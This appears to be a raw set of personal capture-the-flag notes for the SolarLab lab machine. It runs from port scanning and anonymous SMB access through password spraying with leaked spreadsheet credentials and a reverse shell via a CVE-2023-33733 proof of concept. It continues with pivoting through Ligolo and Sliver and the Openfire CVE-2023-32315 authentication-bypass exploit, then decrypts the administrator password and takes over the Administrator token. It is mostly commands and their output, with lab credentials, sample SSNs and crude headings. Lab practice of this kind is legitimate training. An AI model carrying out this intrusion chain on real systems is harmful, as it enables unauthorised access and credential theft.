
```
kali@kali ~> nmap -sC -sV -Pn 10.10.11.16
Nmap scan report for 10.10.11.16
Host is up (0.29s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
80/tcp  open  http          nginx 1.24.0
|_http-title: Did not follow redirect to http://solarlab.htb/
|_http-server-header: nginx/1.24.0
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s
| smb2-time:
|   date: 2024-07-03T23:28:19
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.28 seconds

```


```
kali@kali ~> nxc smb 10.10.11.16 -u 'a' -p '' --shares
SMB         10.10.11.16     445    SOLARLAB         [*] Windows 10 / Server 2019 Build 19041 x64 (name:SOLARLAB) (domain:solarlab) (signing:False) (SMBv1:False)
SMB         10.10.11.16     445    SOLARLAB         [+] solarlab\a:
SMB         10.10.11.16     445    SOLARLAB         [*] Enumerated shares
SMB         10.10.11.16     445    SOLARLAB         Share           Permissions     Remark
SMB         10.10.11.16     445    SOLARLAB         -----           -----------     ------
SMB         10.10.11.16     445    SOLARLAB         ADMIN$                          Remote Admin
SMB         10.10.11.16     445    SOLARLAB         C$                              Default share
SMB         10.10.11.16     445    SOLARLAB         Documents       READ
SMB         10.10.11.16     445    SOLARLAB         IPC$            READ            Remote IPC

```


```
kali@kali ~> smbclient \\\\10.10.11.16\\Documents -U "anonymous%"
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Fri Apr 26 10:47:14 2024
  ..                                 DR        0  Fri Apr 26 10:47:14 2024
  concepts                            D        0  Fri Apr 26 10:41:57 2024
  desktop.ini                       AHS      278  Fri Nov 17 05:54:43 2023
  details-file.xlsx                   A    12793  Fri Nov 17 07:27:21 2023
  My Music                        DHSrn        0  Thu Nov 16 14:36:51 2023
  My Pictures                     DHSrn        0  Thu Nov 16 14:36:51 2023
  My Videos                       DHSrn        0  Thu Nov 16 14:36:51 2023
  old_leave_request_form.docx         A    37194  Fri Nov 17 05:35:57 2023

```

```

```



## Details file excel

| Password File   |              |                                                         |                        |                                      |                   |                                                                 |                               |
| --------------- | ------------ | ------------------------------------------------------- | ---------------------- | ------------------------------------ | ----------------- | --------------------------------------------------------------- | ----------------------------- |
|                 |              |                                                         |                        |                                      |                   |                                                                 |                               |
| Alexander's SSN |              | 123-23-5424                                             |                        |                                      |                   |                                                                 |                               |
| Claudia's SSN   |              | 820-378-3984                                            |                        |                                      |                   |                                                                 |                               |
| Blake's SSN     |              | 739-1846-436                                            |                        |                                      |                   |                                                                 |                               |
|                 |              |                                                         |                        |                                      |                   |                                                                 |                               |
| Site            | Account#     | Username                                                | Password               | Security Question                    | Answer            | Email                                                           | Other information             |
| Amazon.com      | 101-333      | [Alexander.knight@gmail.com](mailto:john.doe@gmail.com) | al;ksdhfewoiuh         | What was your mother's maiden name?  | Blue              | [Alexander.knight@gmail.com](mailto:john.doe@gmail.com)         |                               |
| Pefcu           | A233J        | KAlexander                                              | dkjafblkjadsfgl        | What was your high school mascot     | Pine Tree         | [Alexander.knight@gmail.com](mailto:john.doe@gmail.com)         |                               |
| Chase           |              | [Alexander.knight@gmail.com](mailto:john.doe@gmail.com) | d398sadsknr390         | What was the name of your first pet? | corvette          | [Claudia.springer@gmail.com](mailto:Claudia.springer@gmail.com) |                               |
| Fidelity        |              | blake.byte                                              | ThisCanB3typedeasily1@ | What was your mother's maiden name?  | Helena            | [blake@purdue.edu](mailto:blake@purdue.edu)                     |                               |
| Signa           |              | AlexanderK                                              | danenacia9234n         | What was your mother's maiden name?  | Poppyseed muffins | [Alexander.knight@gmail.com](mailto:john.doe@gmail.com)         | account number: 1925-47218-30 |
|                 |              | ClaudiaS                                                | dadsfawe9dafkn         | What was your mother's maiden name?  | yellow crayon     | [Claudia.springer@gmail.com](mailto:Claudia.springer@gmail.com) | account number: 3872-03498-45 |
| Comcast         | JHG3434      |                                                         |                        |                                      |                   |                                                                 |                               |
| Vectren         | YUIO576      |                                                         |                        |                                      |                   |                                                                 |                               |
| Verizon         | 1111-5555-33 |                                                         |                        |                                      |                   |                                                                 |                               |



## Word document yet









# KONTOL BABI PUTONNGG!!

```
kali@kali ~> nxc smb 10.10.11.16 -u users.trxt -p passwords.txt
SMB         10.10.11.16     445    SOLARLAB         [*] Windows 10 / Server 2019 Build 19041 x64 (name:SOLARLAB) (domain:solarlab) (signing:False) (SMBv1:False)
SMB         10.10.11.16     445    SOLARLAB         [+] solarlab\blake.byte:al;ksdhfewoiuh
kali@kali ~> nxc smb 10.10.11.16 -u users.trxt -p passwords.txt --continue-on-success
SMB         10.10.11.16     445    SOLARLAB         [*] Windows 10 / Server 2019 Build 19041 x64 (name:SOLARLAB) (domain:solarlab) (signing:False) (SMBv1:False)
SMB         10.10.11.16     445    SOLARLAB         [+] solarlab\blake.byte:al;ksdhfewoiuh
SMB         10.10.11.16     445    SOLARLAB         [+] solarlab\KAlexander:al;ksdhfewoiuh
SMB         10.10.11.16     445    SOLARLAB         [+] solarlab\AlexanderK:al;ksdhfewoiuh
SMB         10.10.11.16     445    SOLARLAB         [+] solarlab\ClaudiaS:al;ksdhfewoiuh
SMB         10.10.11.16     445    SOLARLAB         [+] solarlab\:al;ksdhfewoiuh

```


```
kali@kali ~> impacket-lookupsid anonymous@solarlab.htb -no-pass | awk '{print $2}' | awk -F '\\' '{print $2}' | sed 1,5d
Administrator
Guest
DefaultAccount
WDAGUtilityAccount
None
blake
openfire

```


## KONTOL BABI PUTON V2


`BlakeB:ThisCanB3typedeasily1@`

RevShell in the phone use the POC from github
https://github.com/c53elyas/CVE-2023-33733
https://www.revshells.com/

```
PS C:\Users\blake\Documents> type start-app.bat
@ECHO OFF

cd "c:\users\blake\documents\app"

:loopstart
START /B waitress-serve.exe --listen 127.0.0.1:5000 --threads 10 app:app
timeout /t 600 /nobreak > NUL
taskkill /f /im python3.11.exe
timeout /t 5 /nobreak > NUL
goto loopstart

```



```
1|blakeb|ThisCanB3typedeasily1@
2|claudias|007poiuytrewq
3|alexanderk|HotP!fireguard
```

```
kali@kali ~> nxc smb 10.10.11.16 -u users.trxt -p passwords.txt --continue-on-success
SMB         10.10.11.16     445    SOLARLAB         [*] Windows 10 / Server 2019 Build 19041 x64 (name:SOLARLAB) (domain:solarlab) (signing:False) (SMBv1:False)
SMB         10.10.11.16     445    SOLARLAB         [+] solarlab\blake.byte:al;ksdhfewoiuh
SMB         10.10.11.16     445    SOLARLAB         [+] solarlab\KAlexander:al;ksdhfewoiuh
SMB         10.10.11.16     445    SOLARLAB         [+] solarlab\AlexanderK:al;ksdhfewoiuh
SMB         10.10.11.16     445    SOLARLAB         [+] solarlab\ClaudiaS:al;ksdhfewoiuh
SMB         10.10.11.16     445    SOLARLAB         [-] solarlab\blake:al;ksdhfewoiuh STATUS_LOGON_FAILURE
SMB         10.10.11.16     445    SOLARLAB         [-] solarlab\openfire:al;ksdhfewoiuh STATUS_LOGON_FAILURE
SMB         10.10.11.16     445    SOLARLAB         [-] solarlab\blake:dkjafblkjadsfgl STATUS_LOGON_FAILURE
SMB         10.10.11.16     445    SOLARLAB         [-] solarlab\openfire:dkjafblkjadsfgl STATUS_LOGON_FAILURE
SMB         10.10.11.16     445    SOLARLAB         [-] solarlab\blake:d398sadsknr390 STATUS_LOGON_FAILURE
SMB         10.10.11.16     445    SOLARLAB         [-] solarlab\openfire:d398sadsknr390 STATUS_LOGON_FAILURE
SMB         10.10.11.16     445    SOLARLAB         [+] solarlab\blake:ThisCanB3typedeasily1@
SMB         10.10.11.16     445    SOLARLAB         [-] solarlab\openfire:ThisCanB3typedeasily1@ STATUS_LOGON_FAILURE
SMB         10.10.11.16     445    SOLARLAB         [-] solarlab\openfire:danenacia9234n STATUS_LOGON_FAILURE
SMB         10.10.11.16     445    SOLARLAB         [-] solarlab\openfire:dadsfawe9dafkn STATUS_LOGON_FAILURE
SMB         10.10.11.16     445    SOLARLAB         [-] solarlab\openfire:ThisCanB3typedeasily1@ STATUS_LOGON_FAILURE
SMB         10.10.11.16     445    SOLARLAB         [-] solarlab\openfire:007poiuytrewq STATUS_LOGON_FAILURE
SMB         10.10.11.16     445    SOLARLAB         [+] solarlab\openfire:HotP!fireguard
```





# Ligolo




```
kali@kali ~/tools [1]> sudo ./proxy -selfcert
[sudo] password for kali:
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC!
WARN[0000] Using self-signed certificates
WARN[0000] TLS Certificate fingerprint for ligolo is: CB4F853C6291BB59F5C2EB52174AAB5BD44C3305190C7CFC7943A4173CDF2AE6
INFO[0000] Listening on 0.0.0.0:11601
    __    _             __
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /
        /____/                          /____/

  Made in France ♥            by @Nicocha30!
  Version: 0.6.1

ligolo-ng »
```

```

```








---




```
[server] sliver (ORANGE_AMBASSADOR) > socks5 start

[*] Started SOCKS5 127.0.0.1 1081
```

```

```


```
kali@kali ~/CVE-2023-32315 (main)> proxychains python3 CVE-2023-32315.py -t http://localhost:9090
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17


 ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗ ██████╗      ██████╗ ██████╗ ██████╗  ██╗███████╗
██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗╚════██╗     ╚════██╗╚════██╗╚════██╗███║██╔════╝
██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝ █████╔╝█████╗█████╔╝ █████╔╝ █████╔╝╚██║███████╗
██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝  ╚═══██╗╚════╝╚═══██╗██╔═══╝  ╚═══██╗ ██║╚════██║
╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗██████╔╝     ██████╔╝███████╗██████╔╝ ██║███████║
 ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝╚═════╝      ╚═════╝ ╚══════╝╚═════╝  ╚═╝╚══════╝

Openfire Console Authentication Bypass Vulnerability (CVE-2023-3215)
Use at your own risk!

[..] Checking target: http://localhost:9090
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  127.0.0.1:9090  ...  OK
Successfully retrieved JSESSIONID: node01ftyqpizgj4q6zney5f0geo942.node0 + csrf: AMLjJ7XMHrqaQA5
[proxychains] Strict chain  ...  127.0.0.1:1081  ...  127.0.0.1:9090  ...  OK
User added successfully: url: http://localhost:9090 username: 4gub7g password: qxfgut

```



```
INSERT INTO OFUSER VALUES('admin','gjMoswpK+HakPdvLIvp6eLKlYh0=','9MwNQcJ9bF4YeyZDdns5gvXp620=','yidQk5Skw11QJWTBAloAb28lYHftqa0x',4096,NULL,'becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442','Administrator','admin@solarlab.htb','001700223740785','0')

```

```
INSERT INTO OFPROPERTY VALUES('passwordKey','hGXiFzsKaAeYLjn',0,NULL)
```



```
kali@kali ~/openfire_decrypt (master) [1]> java OpenFireDecryptPass.java becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442 hGXiFzsKaAeYLjn
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
ThisPasswordShouldDo!@ (hex: 005400680069007300500061007300730077006F0072006400530068006F0075006C00640044006F00210040)

```



```
[server] sliver (THICK_EXTREME) > runas -u Administrator -P ThisPasswordShouldDo!@ -p cmd.exe

[*] Successfully ran cmd.exe  on THICK_EXTREME

[server] sliver (THICK_EXTREME) > runas -u Administrator -P ThisPasswordShouldDo!@ -p 'C:\temp\THICK_EXTREME.exe'

[*] Successfully ran C:\temp\THICK_EXTREME.exe  on THICK_EXTREME

[*] Beacon 9935bec1 THICK_EXTREME - 10.10.11.16:53923 (solarlab) - windows/amd64 - Thu, 04 Jul 2024 07:44:10 EDT

```

```
[server] sliver (THICK_EXTREME) > make-token -u administrator -p ThisPasswordShouldDo!@ --logon-type LOGON_INTERACTIVE
[*] Successfully impersonated \administrator. Use `rev2self` to revert to your previous token.
[server] sliver (THICK_EXTREME) > whoami
Logon ID: SOLARLAB\openfire
[*] Current Token ID: SOLARLAB\Administrator

```